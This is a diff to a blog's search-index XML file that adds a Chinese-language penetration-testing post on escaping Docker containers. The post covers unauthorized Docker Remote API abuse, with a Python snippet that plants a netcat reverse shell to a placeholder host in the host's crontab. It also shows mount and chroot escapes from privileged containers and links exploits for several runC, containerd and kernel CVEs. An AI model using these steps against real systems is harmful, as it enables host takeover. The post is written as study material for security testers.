@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>一些Docker逃逸漏洞</title>
+      <link href="2021/some-docker-escape-vulnerabilities.html"/>
+      <url>2021/some-docker-escape-vulnerabilities.html</url>
+      
+        <content type="html"><![CDATA[<p>渗透测试中，常会拿到Docker环境的Shell，为了扩展攻击面和进一步拿到有价值数据，不得不需要逃逸到宿主机上。所以查询了目前的Docker逃逸手法，做个复现总结。</p><a id="more"></a><h2 id="判断是否为Docker环境"><a href="#判断是否为Docker环境" class="headerlink" title="判断是否为Docker环境"></a>判断是否为Docker环境</h2><ul><li><p>检查是否存在<code>/.dockerenv</code>文件（可能没有）；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la / | grep .dockerenv</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210223160653.png" alt=".dockerenv"></p></li><li><p>检查<code>/proc/1/cgroup</code>文件内是否存在<code>docker</code>字符串；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup | grep docker</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210223160913.png" alt="/proc/1/cgroup"></p></li><li><p>检测虚拟化环境（可能没有）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemd-detect-virt -c</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210223161235.png" alt="systemd-detect-virt"></p></li></ul><h2 id="Docker逃逸方法"><a href="#Docker逃逸方法" class="headerlink" title="Docker逃逸方法"></a>Docker逃逸方法</h2><h3 id="配置不当引发Docker逃逸"><a href="#配置不当引发Docker逃逸" class="headerlink" title="配置不当引发Docker逃逸"></a>配置不当引发Docker逃逸</h3><h4 id="Docker-Remote-API-未授权"><a href="#Docker-Remote-API-未授权" class="headerlink" title="Docker Remote API 未授权"></a>Docker Remote API 未授权</h4><p>可参考<a href="https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce">vulhub</a>的漏洞环境。利用方法是，我们随意启动一个容器，并将宿主机的<code>/etc</code>目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p><p>Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://your-ip:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><p>Github找到的一个利用工具：<a href="https://github.com/Tycx2ry/docker_api_vul">docker_api_vul</a></p><h4 id="Docker-高危启动参数"><a href="#Docker-高危启动参数" class="headerlink" title="Docker 高危启动参数"></a>Docker 高危启动参数</h4><p>当操作者执行<code>--privileged</code>（特权模式）时，Docker将允许容器访问宿主机上的所有设备，使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p><p>例如docker管理员启动容器时使用了<code>--privileged</code>参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd --privileged ubuntu:latest /bin/bash</span><br></pre></td></tr></table></figure><p>在该容器内部查看磁盘信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210224103538.png" alt="fdisk -l"></p><p>可以发现宿主机磁盘信息，攻击者可以直接在容器内部挂载<code>/dev/sda1</code>，即可访问宿主机磁盘数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="comment"># 挂载/dev/sda1磁盘</span></span><br><span class="line">chroot /mnt</span><br><span class="line"><span class="comment"># 切换根目录至/mnt</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210224103846.png" alt="mount-chroot"></p><p>到这里已经成功逃逸了，然后就是常规的写入定时计划反弹shell或者写入ssh密钥实现免密登陆等（与redis未授权相似）。</p><p>除特权模式外Docker通过Namespace实现六项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--cap-add=SYS_ADMIN  <span class="comment"># 启动时，允许执行mount特权操作，需获得资源挂载进行利用。</span></span><br><span class="line">--net=host           <span class="comment"># 启动时，绕过Network Namespace</span></span><br><span class="line">--pid=host           <span class="comment"># 启动时，绕过PID Namespace</span></span><br><span class="line">--ipc=host           <span class="comment"># 启动时，绕过IPC Namespace</span></span><br></pre></td></tr></table></figure><h3 id="由Docker程序漏洞逃逸"><a href="#由Docker程序漏洞逃逸" class="headerlink" title="由Docker程序漏洞逃逸"></a>由Docker程序漏洞逃逸</h3><h4 id="CVE-2019-5736-RunC漏洞逃逸"><a href="#CVE-2019-5736-RunC漏洞逃逸" class="headerlink" title="CVE-2019-5736 - RunC漏洞逃逸"></a>CVE-2019-5736 - RunC漏洞逃逸</h4><p><strong>影响版本：</strong></p><p>Docker Version &lt;=18.09.2<br>RunC Version &lt;=1.0-rc6</p><p><strong>Exploit：</strong></p><p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p><img src="https://oss.zjun.info/zjun.info/20210224113620.png" alt="CVE-2019-5736-PoC"></p><p>其中payload可设置为反弹shell命令。</p><h4 id="CVE-2019-14271-Docker-cp-命令漏洞逃逸"><a href="#CVE-2019-14271-Docker-cp-命令漏洞逃逸" class="headerlink" title="CVE-2019-14271 - Docker cp 命令漏洞逃逸"></a>CVE-2019-14271 - Docker cp 命令漏洞逃逸</h4><p><strong>影响版本：</strong></p><p>18.09 &lt; Docker Version &lt; 19.03.1</p><p>Docker采用Golang语言编写。存在漏洞的Docker版本采用Go v1.11编译。简单的说漏洞来源是因为<code>docker cp</code>时会调用辅助进程<code>docker-tar</code>。并且在运行时会加载多个<code>libnss_*.so</code>库。</p><p><code>docker-tar</code>的原理是<code>chroot</code>到容器中，归档其中请求的文件及目录，然后将生成的<code>tar</code>文件传回Docker守护进程，该进程负责将文件提取到宿主机上的目标目录中。</p><p>除了chroot到容器文件系统外，docker-tar并没有被容器化。它是在host命名空间运行的，权限为root全新且不受限于cgroups或seccomp。因此，通过注入代码到docker-tar，恶意容器就可以获取host主机的完全root访问权限。</p><p><strong>攻击场景：</strong></p><ul><li>容器运行含有恶意<code>libnss_*.so</code>库的镜像；</li><li>容器中含有被攻击者替换的<code>libnss_*.so</code>库。</li></ul><p>漏洞利用可参考：<a href="https://xz.aliyun.com/t/6806">CVE-2019-14271：Docker copy漏洞分析</a></p><h4 id="CVE-2020-15257-Containerd漏洞逃逸"><a href="#CVE-2020-15257-Containerd漏洞逃逸" class="headerlink" title="CVE-2020-15257 - Containerd漏洞逃逸"></a>CVE-2020-15257 - Containerd漏洞逃逸</h4><p><strong>影响版本：</strong></p><p>Containerd Version &lt;= 1.3.7 / &lt;=1.4.0 / &lt;=1.4.1</p><p>可运行<code>docker version</code>查看其<code>Containerd Version</code>。</p><p><strong>Exploit：</strong></p><p><a href="https://github.com/cdk-team/CDK/">https://github.com/cdk-team/CDK/</a></p><h3 id="由内核漏洞逃逸"><a href="#由内核漏洞逃逸" class="headerlink" title="由内核漏洞逃逸"></a>由内核漏洞逃逸</h3><h4 id="CVE-2016-5195-Dirty-Cow脏牛提权漏洞逃逸"><a href="#CVE-2016-5195-Dirty-Cow脏牛提权漏洞逃逸" class="headerlink" title="CVE-2016-5195 - Dirty Cow脏牛提权漏洞逃逸"></a>CVE-2016-5195 - Dirty Cow脏牛提权漏洞逃逸</h4><p><strong>影响版本：</strong></p><p>Linux kernel &gt;= 2.6.22（2007年发行到2016年10月18日之间发行的Linux内核）</p><p>Dirty Cow（CVE-2016-5195）是Linux内核中的提权漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。Docker与宿主机共享内核，因此容器需要运行在存在Dirty Cow漏洞的宿主机里。</p><p><strong>Exploit：</strong></p><p><a href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/xiaozi/p/13423853.html">https://www.cnblogs.com/xiaozi/p/13423853.html</a></li><li><a href="https://xz.aliyun.com/t/8558">https://xz.aliyun.com/t/8558</a></li><li><a href="https://xz.aliyun.com/t/7881">https://xz.aliyun.com/t/7881</a></li><li><a href="https://xz.aliyun.com/t/6806">https://xz.aliyun.com/t/6806</a></li><li><a href="https://www.freebuf.com/vuls/260512.html">https://www.freebuf.com/vuls/260512.html</a></li><li><a href="https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce">https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Docker逃逸 </tag>
+            
+            <tag> CVE-2016-5195 </tag>
+            
+            <tag> CVE-2020-15257 </tag>
+            
+            <tag> CVE-2019-5736 </tag>
+            
+            <tag> CVE-2019-14271 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>审计 Typecho 反序列化导致任意代码执行</title>
       <link href="2021/audit-typecho-deserialize-to-rce.html"/>
       <url>2021/audit-typecho-deserialize-to-rce.html</url>
@@ -572,9 +605,9 @@
       
         <tags>
             
-            <tag> Python </tag>
-            
             <tag> 不蒜子 </tag>
+            
+            <tag> Python </tag>
             
         </tags>
       
@@ -628,11 +661,11 @@
       
         <tags>
             
+            <tag> Python </tag>
+            
             <tag> ThinkCmf </tag>
             
             <tag> Web渗透 </tag>
-            
-            <tag> Python </tag>
             
             <tag> Exploit </tag>
             
